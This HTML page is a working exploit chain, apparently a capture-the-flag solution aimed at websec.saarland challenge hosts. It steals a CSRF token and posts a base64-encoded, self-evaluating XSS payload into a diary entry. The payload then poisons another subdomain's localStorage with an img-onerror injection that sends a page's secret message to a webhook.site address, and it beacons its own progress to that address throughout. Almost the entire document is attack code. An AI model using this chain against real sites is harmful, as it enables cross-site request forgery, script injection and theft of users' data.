<!DOCTYPE html>
<html>
<body>
    <script>
        // STEP 1: Did the bot even load the GitHub page?
        const W = "https://webhook.site/3edd777c-81ed-4ac7-9380-bf960ab73bd2";
        new Image().src = W + "/?step=1_github_started";
    </script>

    <!-- Load the CSRF token -->
    <script src="https://owley-madison.jeopardy.websec.saarland/csrf_script.js"></script>

    <script>
        window.onload = function() {
            const tokenInput = document.querySelector('input[name="csrfmiddlewaretoken"]');
            if (!tokenInput) {
                new Image().src = W + "/?step=error_no_token";
                return;
            }
            const token = tokenInput.value;
            new Image().src = W + "/?step=2_token_grabbed"; // STEP 2

            // We write the Diary XSS as plain text, then Base64 encode it 
            // to prevent the server from breaking our quotes or tags.
            const diaryJS = `
                var W = "https://webhook.site/3edd777c-81ed-4ac7-9380-bf960ab73bd2";
                new Image().src = W + "/?step=3_diary_xss_running";
                document.domain = "owley-madison.jeopardy.websec.saarland";
                
                var f = document.createElement("iframe");
                f.src = "https://match.owley-madison.jeopardy.websec.saarland/";
                f.onload = function() {
                    new Image().src = W + "/?step=4_iframe_loaded";
                    try {
                        var payload = '</option><img src=x onerror="new Image().src=\\'https://webhook.site/3edd777c-81ed-4ac7-9380-bf960ab73bd2/?flag=\\'+encodeURIComponent(document.getElementById(\\'message\\').value)">';
                        f.contentWindow.localStorage.setItem("favorites", JSON.stringify([payload]));
                        new Image().src = W + "/?step=5_storage_poisoned";
                        window.location.href = "https://chat.owley-madison.jeopardy.websec.saarland/";
                    } catch(e) {
                        new Image().src = W + "/?step=error_iframe_" + btoa(e.message);
                    }
                };
                document.body.appendChild(f);
            `;

            // Wrap it in a script tag that decodes and evals itself safely
            const safePayload = "<script>eval(atob('" + btoa(diaryJS) + "'));<\/script>";

            const form = document.createElement('form');
            form.action = 'https://diary.owley-madison.jeopardy.websec.saarland/entry';
            form.method = 'POST';
            
            // Hidden inputs to hold the payload and token safely
            form.innerHTML = '<input name="content" id="c"><input name="csrfmiddlewaretoken" id="t">';
            document.body.appendChild(form);
            
            document.getElementById('c').value = safePayload;
            document.getElementById('t').value = token;
            
            form.submit();
            new Image().src = W + "/?step=2.5_form_submitted";

            // Wait a full second to ensure the server saves the diary entry before we redirect
            setTimeout(() => {
                window.location.href = 'https://diary.owley-madison.jeopardy.websec.saarland/';
            }, 1000);
        };
    </script>
    <form></form> <!-- Dummy form for csrf_script.js to attach to -->
</body>
</html>
